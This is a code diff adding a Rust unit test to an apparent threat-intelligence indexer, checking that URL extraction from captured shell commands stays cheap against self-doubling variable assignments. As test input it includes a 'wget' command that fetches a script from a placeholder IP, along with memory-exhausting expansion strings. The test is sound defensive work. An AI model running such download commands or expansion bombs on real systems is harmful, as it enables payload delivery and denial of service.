@@ -2367,6 +2367,24 @@ Jx4u80n/q0WquQbw1QIDAQAB
         );
     }
 
+    // The campaign indexer hands every captured command and every artifact to these two, inside
+    // the daemon. `A=$A$A` typed into a shell once resolved to gigabytes in the url extractor and
+    // OOM-killed the daemon on every restart; it is now four bytes of unresolved text.
+    #[test]
+    fn a_doubling_assignment_in_a_command_or_artifact_is_cheap() {
+        let start = std::time::Instant::now();
+        assert!(extract_from_command("A=$A$A").is_empty());
+        let found = extract_from_command("A=$A$A; wget http://198.51.100.4/x.sh");
+        assert_eq!(of(IocKind::Url, &found), vec!["http://198.51.100.4/x.sh"]);
+        let chain: String = (1..17)
+            .map(|i| format!("A{i}={}\n", format!("$A{}", i + 1).repeat(4)))
+            .collect();
+        let (_, found) = extract_from_artifact(format!("{chain}A17=x\n").as_bytes())
+            .expect("a small text artifact is scanned");
+        assert!(found.is_empty(), "{found:?}");
+        assert!(start.elapsed().as_secs() < 2, "took {:?}", start.elapsed());
+    }
+
     #[test]
     fn every_kind_round_trips_through_its_stored_name() {
         for kind in IocKind::ALL {
